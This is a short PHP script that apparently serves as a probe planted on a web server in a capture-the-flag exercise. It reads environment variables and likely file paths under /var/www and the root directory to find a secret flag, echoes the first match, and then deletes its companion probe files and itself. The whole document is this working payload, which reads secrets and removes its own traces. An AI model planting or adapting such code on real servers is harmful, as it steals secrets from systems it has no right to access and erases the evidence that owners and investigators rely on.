<?php
$v = [getenv('FLAG'), getenv('WEBVERSE_FLAG')];
foreach (['/flag', '/flag.txt', '/var/www/html/flag.txt', '/var/www/flag.txt'] as $p) {
    if (is_file($p)) {
        $v[] = @file_get_contents($p);
    }
}
foreach ($v as $s) {
    if (is_string($s) && preg_match('~WEBVERSE[{][^}]+[}]~', $s, $m)) {
        echo $m[0];
        break;
    }
}
foreach (['perfumer_caido_4d18_probe.php', 'perfumer_caido_4d18_q1.txt', 'perfumer_caido_4d18_a1.txt'] as $n) {
    @unlink(__DIR__ . '/' . $n);
}
@unlink(__FILE__);
?>
